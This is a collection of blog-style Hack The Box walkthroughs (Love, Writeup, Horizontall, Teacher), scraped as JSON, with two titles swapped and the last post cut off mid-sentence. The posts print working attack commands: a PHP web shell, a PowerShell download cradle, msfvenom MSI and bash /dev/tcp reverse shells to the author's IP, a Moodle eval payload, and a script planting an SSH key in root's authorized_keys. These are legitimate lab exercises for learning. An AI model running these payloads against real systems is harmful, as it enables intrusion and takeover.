        "link": "https://medium.com/@joemcfarland/hack-the-box-writeup-writeup-338083ef9057",
        "content": "Love is an easy Windows box created by pwnmeow on Hack The Box and was released on the 1st of May 2021. Hello world, welcome to Haxez where today I will explain how I hacked Love. To hack this box is it recommended that you have Windows enumeration and web enumeration skills. From hacking this box, you will learn exploit modification, server-side request forgery, applocker policies, and always install everything misconfiguration.\nLove Enumeration\nAfter spawning the box, I sent a single ping request to ensure it was online. I then followed up with a Nmap scan targeting all ports, requesting service versions, and running default scripts. Finally, I gave it a minimum packet rate of 10000 and said to output all formats. From the results, I learnt that there were several ports open. This included various ports for HTTP, 445 for SMB, 3306 for MySQL, 5985 and 5986 for HTTPAPI or WinRM, the list goes on.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nmap -sC -sV -p- 10.129.48.103 --min-rate 10000 -oA love\nAs SMB was listening, the first thing I did was run crackmapexec to enumerate shares and host information. From the results, I learnt that it was a Windows 10 Pro box with the hostname LOVE. The domain was also called Love which suggests the box is not a domain controller (as they have the same name). Furthermore, SMBv1 was enabled.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ crackmapexec smb 10.129.48.103\nLove Web Application Enumeration\nAfter poking SMB, I went to take a look at the web application. First, I visited the application in my browser and saw that it was a type of voting application. Next, I appended various extensions to the end of the index page. As a result, I learnt that the application was written in PHP.\nFollowing that, I ran whatweb against the application and learnt that the PHP version was 7.3.27. Furthermore, I also learnt that the Apache version was 2.4.46 and that the application was using the Bootstrap framework.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo whatweb -a3 http://10.129.48.103/ -v\nI also ran a gobuster scan to try to identify any directories or files that would disclose sensitive information about the application. However, other than some 301 and 302 redirections and a bunch of 403 errors, I didn’t find much.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ gobuster dir -u http://10.129.48.103/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,bak -o gobuster.love.txt\nMore Love Application Enumeration\nI decided to look at the other HTTP ports that were discovered during the Nmap scan. Therefore, I punched the IP address of the box into my browser and specified port 5000. Immediately, I received a Forbidden error. I shouldn’t have been surprised by this as Nmap displayed the forbidden error in the results.\nSubdomains and Virtual Hosts\nI revisited the results of the Nmap scan to choose which service to poke at next. It was then that I noticed the common name of the SSL certificate on port 443. Below, you can see the output from the Nmap scan showing the subdomain of staging.love.htb.\nImmediately, I excitedly added the IP address and new subdomain to my host file. Surely this was the foothold that I’d been looking for. Finally, I found a weakness in this box’s armour! I entered the domain into my browser and…. Forbidden. Wow, talk about rejection.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ echo '10.129.48.103 staging.love.htb' | sudo tee -a /etc/hosts\nHowever, visiting the subdomain via HTTP instead of HTTPS loaded a page. I poked around the application for a bit and noticed a demo page. In short, the demo page is a free file scanner that allows the user to submit a URL with a file for scanning.\nServer-Side Request Forgery\nI wanted to see if the demo page worked so I set up a netcat listener on my local machine. Next, I input the location of a file into the Scan File input box and sent the request. Sure enough, the application pulled the file down from my host and displayed the contents. Admittedly, my first thought was to try and get it to execute a payload by downloading it from my host. However, those attempts failed.\nThere is a Web Application vulnerability known as Server Side Request Forgery. In short, SSRF exploits the box’s own trust. Because the resource request is sent from the box itself, it may allow access to otherwise forbidden files. To illustrate, I input the loopback address of 127.0.0.1 followed by port 5000 into the URL box. This was the page I was previously unable to access. Upon sending the request, I received credentials.\nVoting System Admin\nWith the username and password successfully stolen via SSRF, I headed back to the voting system by navigating to the IP address. Next, I supplied the stolen credentials and… they didn’t work. This is another one of those easy boxes which seems more difficult than it is because it takes so long.\nFortunately, I ran a gobuster earlier and remember seeing a 301 redirection from /admin to /admin/. This is where gobuster attempted to load a file called admin but was redirected to a directory called admin, likely containing a PHP file. Therefore, I headed to the admin directory and was able to log in with the credentials.\nLove RCE POC\nI noticed the Copyright disclaimer at the bottom of the page and decided to perform a Google search for the name SourceCodeStar. After a few Google searches, I stumbled upon several Exploit Database pages which suggested there was an authenticated remote code execution. Unfortunately, there didn’t appear to be a CVE number associated with it.\nAdmittedly, I wanted some guidance on this step so I am going to copy what IppSec did >>HERE<<. First, I navigated to the Voters menu option and clicked the New button. This spawned the window you see below. I populated the window with some test data and selected a jpeg file for the photo.\nNext, I turned intercept on and clicked the save button. Burp successfully intercepted the request which I then modified. I changed the filename to “haxez.php” and then removed the jpeg data and replaced it with a PHP web shell.\n------WebKitFormBoundaryM93O7d6XpEp6S0dPContent-Disposition: form-data; name=\"photo\"; filename=\"haxez.php\"Content-Type: image/jpeg<?php system($_REQUEST[\"cmd\"]); ?>\nThen, I navigated to the payload in my browser and passed the dir command to the cmd parameter. It successfully listed out the contents of the directory.\nLove Foothold\nNow that I had command execution, it was time to get on the box using a reverse shell. I downloaded nishang from >>HERE<< and copied the Invoke-PowerShellTcpOneLine.ps1 payload to my current working directory. Next, I opened the payload with VIM and changed the IP address and port to my tun0 IP address and port 9001.\nThen, I sent my original directory listing request to Burp repeater and changed the request method to a POST. Next, I started a netcat listener and then added the following Payload to Burp and sent the request. I instantly received a 404 error. There must be a clean-up script on the box that is removing the payloads.\ncmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/hax.ps1')\"\nI quickly repeated the process by uploading a new command shell and executing the above payload. Finally, I got a reverse shell and had a foothold on the box. From here, I was able to grab the user flag from the phoebe users desktop directory.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9001                                             [sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59730PS C:\\xampp\\htdocs\\omrs\\images> whoamilove\\phoebePS C:\\xampp\\htdocs\\omrs\\images> type C:\\Users\\phoebe\\Desktop\\user.txtd85▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓319\nLove Privilege Escalation\nAfter capturing the user flag, I download the latest version of the 64 bit obfuscated WinPEASS binary. Next, I spawn a Python3 web server and used cURL to download the binary to the target machine. Finally, I ran the executable and saw that the AlwaysInstallElevated value was set to 1 which I presume means it was enabled. Quoting directly from the HackTricks article “If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.”. Is this a useful setting to have as a sysadmin? it seems a bit odd.\nWith this knowledge, I went back to my Linux terminal and used msfvenom to create an MSI payload. The output below will create a Windows x64 reverse shell that connects back to my local host on port 9002. The file type is specified as an MSI file and I saved the output to payload.msi.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi\nI set up a netcat listener to listen on port 9002 and then used cURL to download the payload from the Python web server I still had running. I specified the -o flag to save the payload as payload.msi.\nPS C:\\users\\public\\documents> curl http://10.10.14.36/payload.msi -o payload.msiPS C:\\users\\public\\documents> .\\payload.msi\nFinally, I ran the payload and thankfully, I received a connection back to the netcat listener. I now had a reverse shell as the nt authority\\system user and could finally capture the root flag.\n──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9002                                           [sudo] password for kali: listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59734Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>type \\users\\administrator\\desktop\\root.txttype \\users\\administrator\\desktop\\root.txt64b▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓95f\nLove Learnings\nLove requires patience… the initial enumeration stage of this box took longer than I had hoped. It felt like I was jumping through hoops but it taught me valuable lessons about enumeration. It’s one of those boxes that seemed difficult due to the level of enumeration required to get a foothold, but the actual exploit is easy. Furthermore, it does a great job of demonstrating Server Side Request Forgery which I hadn’t really done before.\nThe privilege escalation was a lot of fun and fairly simple to pull off. I didn’t know about this method of privilege escalation until today so I’ve learnt that too. Overall it’s a fun box but it definitely tested my patience at times. My initial PHP shell just up and vanished so I had to upload that again before getting my reverse shell. For me, it was educational and taught me new techniques which is what I want from an easy box. Thanks for the box."
    },
    {
        "title": "Hack The Box Love Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec",
        "content": "Writeup is an easy Linux box created by jkr on Hack The Box. The box has protections in place to prevent brute-force attacks. The skills required to complete this box are enumeration. The skills obtained from completing this box are process enumeration and path hijacking. Hello world, welcome to Haxez where today I will be explaining how I hacked the Hack The Box Writeup box.\nEnumerating Writeup\nFirst, I spawned the box and connected my attack box to the Hack The Box lab VPN. Next, I sent a ping to the target to ensure it was online and that I could talk to it. Once the box responded, I performed a Nmap scan targeting all ports. Furthermore, I also requested service versions, told it to run default scripts, gave it a minimum packet rate of 10,000, and told it to save the output in all formats named writeup. As you can see from the screenshot below, ports 22 for SSH and 80 for HTTP were open.\nsudo nmap -sC -sV -p- 10.129.95.203 --min-rate 10000 -oA writeup\nWeb Application Enumeration\nSince SSH was unlikely to be the intended attack vector, I moseyed on over to the web application for a gander. It’s… beautiful! The web application appeared to be an in-development blog for Hack The Box writeups. However, the application was being hit with denial-of-service attacks resulting in DoS protection mechanisms being implemented. The DoS protection blocks any IP that triggers a 400 error in the Apache log.\nDomo arigato, Mr Roboto\nDirb, gobuster, ffuf, and other directory and file brute force tools are noisy and would generate 400 errors resulting in an IP ban. Therefore, I had to manually and carefully enumerate the web application. One of the first files I look for when hacking web applications is the robots.txt file. It’s a file that tells search indexing robots to ignore the files contained within it. It prevents pages like admin or log-in from being indexed. However, it’s a double-edged sword as it may disclose sensitive information to malicious threat actors. Navigating to the robots.txt file I found a directory called writeup.\nEnumerating Writeup Technologies\nI navigated to the writeup directory which presented a basic web application with minimal functionality. There were several links to blog posts and clicking on those blog posts revealed that it was a PHP-based application. Furthermore, a parameter named page was being used to retrieve the blog posts. For example, visiting the following URL would retrieve a blog post called blue http://10.129.95.203/writeup/index.php?page=blue. I used whatweb to identify the CMS or Content Management System. As a result, I learned that it was using a version of CMS-Made-Simple from 2004–2019.\nFurthermore, looking at the structure of the CMS I found the location of the changelog file. Navigating to the file revealed the specific version of the CMS being used.\nCMS Made Simple Blind SQL Injection Failures\nUsing searchsploit to search for vulnerabilities impacting CMS Made Simple, I found a blind SQL injection vulnerability. The vulnerability has a CVE designation of CVE-2019–9053. I located the Python script and copied it to my current working directory. You can do this with the searchsploit -m flag to mirror it.\nUnfortunately, attempting to run this exploit produced errors regarding print statements. I wasn’t sure what to do here as I’m crap at Python. Fortunately, IppSecs video explained that I needed to install the termcolor module with pip. While this didn’t resolve the problem, it did point me in the right direction.\nFirst, I had to install pip2.7 which I was able to do by following the post >>HERE<<\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2.7 get-pip.py\nHowever, when attempting to install termcolor, I received errors about an egg or something. After a bit more Google searching, I found this post >>HERE<< which explained I needed to upgrade setuptools.\npip install --upgrade setuptools\nCMS Made Simple Blind SQL Injection Success\nI was finally ready to run the payload. Using the following command, I was able to attack the SQL injection vulnerability and retrieve a salt, username, email address, and password hash. It was awesome watching the script come alive and iterate through the alphabet and pull the information out of the database.\npython2.7 46635.py --url http://10.129.95.203/writeup\nWriteup Foothold\nI echoed the hash followed by a colon, followed by the salt into a file called jkrhash.txt.\necho '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > jkrhash.txt\nNext, I used hashcat with mode 20 (MD5 salt and password) to crack the hash with the wordlist rockyou.\nhashcat -a 0 -m 20 jkrhash.txt /usr/share/wordlists/rockyou.txt\nI was in, I was able to use the credentials to SSH to the box as the jkr user. Furthermore, once on the box, I was able to capture the user flag.\njkr@writeup:~$ cat user.txt8d0▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓9e9\nWriteup System Enumeration\nAfter grabbing the user flag, I started enumerating the system. First, I checked the command history of the jkr user to see if it contained anything interesting. It didn’t. Next, I checked if I could run sudo -l to see what commands jkr could run as sudo. Interestingly, sudo wasn’t found on the system. Finally, I decided to go for the easy option and ran linpeas. I span up a Python webserver and used wget to download it to the /tmp directory. Then, I gave it executable permissions and ran it.\nThe output kept highlighting the /usr/local path as a privilege escalation vector but I didn’t know why. After a bit more investigation, it seems that the jkr user is part of the staff group. According to the Debian wiki the staff group allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name). As you can see from the screenshot below, /usr/local/bin is also the first path that gets called when executing files.\nWriteup Process Enumeration\nI’m still getting my head around this privilege escalation method if I’m honest. However, I think I understand it. To explain, the jkr user is a member of the staff group and the staff group has the ability to modify /usr/local/ without root privileges. If I can find a binary that gets executed as root without it using the absolute file path, then I can drop a malicious binary of the same name inside the /usr/local/bin directory. Then, when the conditions are met for the binary to be executed, my malicious binary gets executed with root privileges because my first environmental path is /usr/local/bin.\nWith that in mind, I ran pspy32 and found that when I log in to SSH with jkr, the run-parts binary is executed without an absolute file path. You can see it in the image below, the third blue line from the bottom.\nNext, I checked to see the ownership of the run-parts binary to see if it was owned by root. I used which to locate it and then ran ls -lash to list the permissions. Sure enough, it was owned by root and genuinely appeared to be the only binary not being executed with a full file path.\nWriteup Privilege Escalation\nIn theory, I should now be able to create my own binary or script called run-parts in /usr/local/bin. Then when I SSH to the system as jkr, my malicious run-parts binary will be executed instead of the one in /bin. There are multiple methods that I could have used to do this. For example, I could have created a script that copied the bash binary to /tmp and gave it setuid capabilities (I think). Additionally, I could have created a reverse shell that connected back to my machine. However, I thought the most reliable method was to drop an SSH key in the root user’s authorized_keys file. Plus, this is the method that IppSec used and it seemed to work.\nWhen the script is executed, it creates a file in /tmp called Exploit-Complete. This isn’t required as it’s just a visual indicator to show that the script was executed. Next, it creates the .ssh directory in the root user’s directory. Then, it echos my public key into the root user’s authorized_keys file. Finally, it gives the file 600 permissions. The script is saved as run-parts and saved to /usr/local/bin. I created it using nano.\n#!/bin/bashtouch /tmp/Exploit-Completemkdir /root/.sshecho 'ssh-rsa AAAA <<<SNIP>>> QqNzw9WKiU0= kali@kali' >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys\nOnce the file was saved, I made it executable by running chmod +x against it. Then I created a new terminal tab and connected back to the box as the jkr user. I checked the /tmp directory and sure enough, the Exploit-Complete file had been created. Hopefully, that means that my public key is now in the root user’s authorized_keys files.\nFinally, I connected SSH as the root user using the private key I generated. I was able to login and grab the root flag.\n┌──(kali㉿kali)-[~/HTB/Writeup]└─$ ssh -i root root@10.129.95.203Last login: Fri Aug  6 08:59:19 2021root@writeup:~# cat root.txt786▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓4b4\nWriteup Learnings\nThis was a fun box which I learned a few things from. The first was getting the Python SQL injection payload to work. As soon as I received that first error I immediately thought that I wasn’t going to be able to complete the box. However, after a bit of persistence, the payload worked and left me with a big grin on my face. The cracking was fairly simple but always good to get some practice.\nThe system enumeration and privilege escalation was interesting. I didn’t know about the staff group before and without guides pointing me in the right direction, I wouldn’t have got it. I’m starting to understand the brilliance of pspy too, without it, I’m not sure how I would have identified the correct binary. Overall this is a good box and has a nice method for practicing different techniques for privilege escalation. You could change your binary to perform different things and then easily trigger it by connecting back to the box. Thanks, jkr, fun box."
    },
    {
        "title": "Hack The Box Horizontall Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-horizontall-writeup-4f10ec21a949",
        "content": "Horizontall is an easy Linux box created by wall99 on Hack The Box and was released on the 28th Aug 2021. Hello world, welcome to haxez where today I will be going through how I hacked Horizontall. To complete this box it is suggested that you have basic Web Enumeration, Linux Enumeration, and SSH Knowledge. The lessons from this box are Source Code Review and Port Forwarding.\nHorizontall Enumeration\nTo ensure that the box was online and that I could talk to it, I sent a ping request. Since the box responded, I performed a Nmap scan against all ports, with default scripts and requested service versions. As a result, I learnt that ports 22 for SSH and 80 for HTTP were open.\nHorizontall Application Enumeration\nNavigating to the IP address in my browser, I was redirected to the domain horizontall.htb. However, as this domain name doesn’t resolve through DNS I received an error from Burp.\nTo fix this, I echoed the box’s IP address and domain name into my host’s file. As a result, when visiting the domain name the application loaded as expected. The web application appeared to be a commercial website for a website development company. However, the website wasn’t functional as the links and the contact us form didn’t work.\n┌──(kali㉿kali)-[~]└─$ echo \"10.129.234.11 horizontall.htb\" | sudo tee -a /etc/hosts\nNext, I ran whatweb but it didn’t reveal much about the application that Nmap hadn’t already told me. It told me the server was Ubuntu and that the web server was nginx.\n┌──(kali㉿kali)-[~]└─$ whatweb http://horizontall.htb/\nI ran 2 gobuster scans, 1 to look for directories and 1 to look for virtual hosts but unfortunately, neither produced anything interesting. I think I’m running gobuster incorrectly for virtual hosts. I believe there is an –append-word argument that needs to be added but I get an error when doing that. I will have to look into that this evening.\n┌──(kali㉿kali)-[~]└─$ gobuster vhost -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -o vhostgobuster.txt -t 50\nHowever, ffuf does find the virtual host. I filtered by a file size of 194 because that was the file size of the generic error response. I’m doing something wrong with gobuster. Since I wouldn’t have found the virtual host, I’m going to ignore these results and continue enumerating. I’m going to search the academy for gobuster this evening.\n┌──(kali㉿kali)-[~]└─$ sudo ffuf -u http://horizontall.htb/ -H \"Host: FUZZ.horizontall.htb\" -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194\nReturn To The Source\nIt’s where one must go when they’ve run out of ideas. As you can see below, there were references to Cascading Style Sheet files and Javascript files. I decided to take a look at the Javascript files to see if they contained anything interesting.\nHowever, the way the browser rendered the code was horrible so I went to https://beautifier.io/ and pasted in the Javascript. Skimming through the code, I noticed a function called getReviews which pointed to the subdomain api-prod.\nAPI Virtual Host Enumeration\nAfter adding the new virtual host to my host file, I navigated to it in my browser. There wasn’t much to look at other than a welcome message.\nI’m pleased to say that gobuster worked for directory brute forcing. It seems there were 3 subdirectories.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\nI navigated to the admin directory which rendered a login page. The page revealed that the technology in use was strapi. Next, I visited the reviews page which returned a JSON response from the server showing reviews of the product.\nFollowing the discovery of the technology, I searched for exploits on Exploit Database and found an RCE. In short, the exploit performs a password reset. It’s written in Python and exploits the vulnerability with the CVE designation CVE-2019-18818. The CVE description explains the following.\nstrapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\nTherefore, I navigated to the /admin/init endpoint to retrieve the service version to determine whether it was vulnerable. The API reported back that it was version 3.0.0-beta.17.4 which suggested it should be.\nHorizontall Foothold\nDon’t you just love it when an exploit just works without having to tinker with it? I copied the code and recreated it locally in a file called exploit.py. Next, I used Python3 to run the code and fed it the URL of the application. Almost immediately, the exploit told me that the password was reset successfully.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ python3 exploit.py http://api-prod.horizontall.htb/\nJust like that, I had code execution and could send myself a reverse shell. First, I set up a netcat listener on my attack box. Next, I ran the following command in the shell on the target machine. Finally, I landed on the box as the strapi user and was able to grab the user flag.\nbash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 9001[sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 46802strapi@horizontall:~/myapi$ ls /homels /homedeveloperstrapi@horizontall:~/myapi$ cat /home/developer/user.txtcat /home/developer/user.txt6e7▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓dc0strapi@horizontall:~/myapi$\nHorizontall Authenticated Enumeration\nFirst, I wanted to establish persistence on the host so I created a .ssh directory in /opt/strapi/.ssh. Next, I created an SSH key using ssh-keygen and echoed the public key into the authorized_keys file. Finally, I gave the SSH private key 600 permissions and used it to SSH to the host. Once I was back on the host I enumerated the listening services and discovered that port 8000 and MySQL were listening locally.\nFirst, I decided to try and get access to MySQL. Starting at the /opt/strapi/ directory, I ran a recursive grep for the word password but was bombarded with noise. After jumping around a few directories I finally found the database password.\nstrapi@horizontall:~/myapi/config$ grep -R passwordenvironments/production/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",environments/development/database.json:        \"password\": \"#J!:F9Zt2u\"environments/staging/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",\nAs a result, I was able to log in to the MySQL database as the development user but this appeared to be a dead end. I queried the database and dumped the contents of the various user tables but couldn’t find any hashes other than the administrators.\nSince MySQL was a dead end, I moved on to see what was listening on port 8000. Using SSH, I performed local port forwarding so that I could access port 8000 via localhost:1234. Upon visiting that port I found a Laravel application.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ ssh -L 1234:localhost:8000 -i key strapi@10.129.234.11\nI ran gobuster to discover directories and was able to identify the /profiles directory. However, the box crapped out shortly after and killed my tunnel.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://localhost:1234/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt\nI recreated the tunnel and navigated to the profiles directory. The application appeared broken and had visual debugging enabled. Searching Google for Laravel Debug exploits resulted in finding this payload >>HERE<<which I recreated locally.\nHorizontall Privilege Escalation\nI ran the exploit using the syntax below and the results indicated that Laravel was running as root. I was almost there, all I needed to do now was craft a reverse shell and send it back to myself.\n┌──(kali㉿kali)-[~/HTB/Horizontall/laravel]└─$ python3 exploit.py http://localhost:1234 Monolog/RCE1 id\nI was close to getting it right the first time. You can see from the screenshot below the different payloads I tried before resuming IppSec’s video. I attempted the first two on my own before resuming the video but as soon as he said curl, I paused it again and executed the payload myself. Little victories.\nI created a shell script which contained the following bash script. I then used the exploit with curl to download the file which I then piped to bash to execute it.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ cat shell.sh      #!/bin/bashbash -i >& /dev/tcp/10.10.14.36/9002 0>&1\nBelow, you can see the exact command I used. It needed to be enclosed in single quotation marks. If medium will let me include it that is.\nThis connected back to my netcat listener and allowed me to capture the root flag.\n┌──(kali㉿kali)-[~]└─$ nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 42330bash: cannot set terminal process group (65829): Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cat /root/root.txtcat /root/root.txt19c▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓8f4root@horizontall:/home/developer/myproject/public#\nHorizontal Learnings\nThere was certainly a lot to learn from this one. I’m starting to understand the difference between difficult and time-consuming boxes. The time it takes to own a box doesn’t necessarily equate to the difficulty. This box took me a long time to complete but it wasn’t that difficult. Owning this box required exploiting publically known vulnerabilities with available exploits. In my opinion, that is exactly what an easy box should be. It did require a lot of enumeration and knowing what to look for.\nI enjoyed this box a lot, it let me practise techniques I’m familiar with. It introduced me to technologies I hadn’t used before and their vulnerabilities. Furthermore, it also highlighted areas where I need to invest time to improve. Admittedly, I was worried that the different exploits weren’t going to work but I was pleasantly surprised. Overall, this was a great box which I’m probably going to revisit to get a better understanding."
    },
    {
        "title": "Hack The Box Teacher Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-teacher-writeup-31979f830ba1",
        "content": "Teacher is an easy Linux box created by mrh4sh on Hack The Box. The official walkthrough states that it’s a medium box. However, it is categorized as an easy box in the machines section. It is recommended that you have basic Linux and MySQL knowledge to complete this box. By completing this box you will learn Website Enumeration, Password Brute-Forcing, Moodle Quiz Module Exploitation, Database Enumeration, Password Cracking, and Linux Symlink Misconfiguration. Hello world, welcome to Haxez where today I will be explaining how I hacked Teacher.\nTeacher Enumeration\nFirst, I spawned the box and connected my attack box to the Hack The Box VPN. Once connected, I sent a ping request to the box to ensure it was online. Then I performed a Nmap scan to check what ports were open. Furthermore, I requested the service versions, asked for default scripts to be run, and that the minimum packet rate was 10000. Finally, I saved the output in all formats to files called teacher. From the results, I learned that only port 80 for HTTP was open and that it was running Apache 2.4.25.\nsudo nmap -sC -sV -p- 10.129.202.224 --min-rate 10000 -oA teacher\nTeacher Web Application Enumeration\nSince port 80 was the only open port, I headed over to the application. There wasn’t a great deal of functionality offered by the application. It seemed fairly generic with few pages that I could interact with. For an application that calls itself Blackhat Highschool, it seemed a bit too clean. I was hoping for something dark and edgy.\nMoving on, I ran whatweb against the application which told me it was an HTML 5 application with JQuery 1.11.1. Next, I navigated to index pages with various different extensions (index.html, index.php). Sure enough, the one that loaded the main page was index.html.\nAs I didn’t have much to go on, I decided to run gobuster to look for hidden content. Perhaps there was a hidden directory or a secret file telling me that the princess is in another castle. I told gobuster to perform a directory attack using the raft-small-words.txt wordlist in SecLists. Furthermore, I also asked it to try various different extensions and set the thread count to 50.\nAs a result, I learned that there was a directory called Moodle. Their GitHub page explains that Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License. Moodle is used for blended learning, distance education flipped classrooms, and other online learning projects in schools, universities, workplaces, and other sectors. I headed to the Moodle directory but received an error because it redirected to teacher.htb. Therefore, I added the IP address and teacher.htb domain to my /etc/hosts file and revisited the directory. Abracadabra, the site started loading.\nPicture In Picture\nI honestly don’t know what to say about this part of the box. I know I wouldn’t have found it if it wasn’t for a walkthrough. It’s not something I regularly check. I found Moodle but had no way to log in. However, directory listing on the images directory was enabled. Visiting each of the images loaded an image as expected, except for 5.png.\nI downloaded the picture locally and used less to review the contents of the file. It wasn’t an image at all. It appeared to be a helpdesk ticket. I can’t fathom how a helpdesk ticket would have ended up on the website. For my own sanity, I’m going to pretend that the helpdesk agent and web developer are the same person. Furthermore, I’m also going to pretend that they accidentally renamed the wrong file and uploaded it. The ticket gave me the username Giovanni and a partial password of Th4C00lTeacha.\nMoodle Bruteforce\nI launched Burp and headed back to the Moodle login page. Next, I populated the login form with the credentials provided in the support ticket. Then, I clicked submit and located the login request in Burp’s HTTP history. I sent the request to the intruder tool and added a character to the end of the password. Then, I highlighted that character and added the payload characters.\nNext, I navigated to the payload tab but because I’m using Burp community edition, I had to create my own payloads. As a result, I combined several wordlists from the SecLists fuzzing directory so that they contained numbers 0 to 9, all alphabetical characters (lower and uppercase), and all special characters.\nI then click the start attack button and watched as Burp went through each payload, appending it to the end of the password. There are other tools that I could have used to do this such as WFUZZ or FFUF but I know how to use Burp so I thought it was the best option. An indication that a specific payload has had a different result is the length of the response produced by the application. The screenshot below shows that most of the responses were 868 characters. However, the payload with the # symbol produced a response with 993 characters.\nEvil Teacher Vulnerability\nI wasn’t sure what the Moodle version was. I ran what web again against the teacher.htb domain Moodle directory but got nothing. As a result, I looked on Google and found that the Moodle version can be found from the Moodle Docs for this page link at the bottom of a course page. This told me that it was Moodle version 3.4.\nThere is a vulnerability in Moodle 3.4 with the CVE designation CVE-2018–1133. The vulnerability is also known as Evil Teacher. It could allow a user with the teacher role to perform code execution by creating a quiz. SonarSource has an excellent writeup on it so I’m not going to attempt to explain it in too much detail. Essentially, formulas are passed to an eval function which allows for code execution. So if a threat actor can create a quiz with a malicious formula in one of the questions, they may be able to execute code.\nTeacher Foothold\nI navigated to the algebra page and enabled editing. Next, I used the add an activity or resource option to add a quiz to the Topic 1 section.\nI gave the quiz a name and description and clicked next.\nAfter that, I clicked the little blue add link on the next page and chose to add a question. Then, I selected the calculated question type as that would be likely to have the option to add a formula. Finally, I pasted the working exploit into the formula and changed the grad value to 100%.\n/*{a*/`$_GET[0]`;//{x}}\nIt was time for the moment of truth. I captured the request with Burp and sent it to the repeater tool. Next, I appended the URL with a payload that would ping my box. I started tcpdump to listen out for ICMP packets that hit my tun0 adaptor and clicked send.\nGET /moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcmid%3D7&appendqnumstring&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=/bin/ping+10.10.14.34 HTTP/1.1\nsudo tcpdump -i tun0 -n icmp\nTo my surprise, it worked the first time. I started receiving ping packets from the target box.\nNow that I had code execution, I modified my payload to a reverse shell, started netcat, and was able to pop a reverse shell.\nGET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=8&0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261' HTTP/1.1\nTeacher System Enumeration\nI couldn’t find the user flag once logged in so I checked the home directory and that there was a user called giovanna. That’s probably where the user.txt file is. I could try switching to that user with the password we logged in to Moodle with. However, I decided to take a look at the database first. I pulled the username and password from the /var/www/html/moodle/config.php file. After logging in, I was able to grab usernames and password hashes from the mdl_users table.\nselect id,username,password from mdl_user;\nI copied the Giovannibak hash to a file on my attack box and used John to crack it with the rockyou wordlist.\nI was then able to switch to the giovanni user and capture the user.txt flag.\nwww-data@teacher:/var/www/html/moodle$ su giovannisu giovanniPassword: expelledgiovanni@teacher:/var/www/html/moodle$ cd ~/cd ~/giovanni@teacher:~$ lslsuser.txt  workgiovanni@teacher:~$ cat user.txtcat user.txt881▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓823\nTeacher Privilege Escalation\nThe box keeps crashing meaning I have to do the above process all over again. As a result, the following explanation is going to be brief because I simply can’t be bothered with this box anymore. Looking at the time stamps on the user’s home directory I could see that something was changing fairly frequently. I set up a Python webserver and download pspy onto the box. Running pspy I noticed that a backup script was running.\nThe backup script was changing to the /home/giovanni/work directory and then backing up the courses directory. It was then changing the directory to 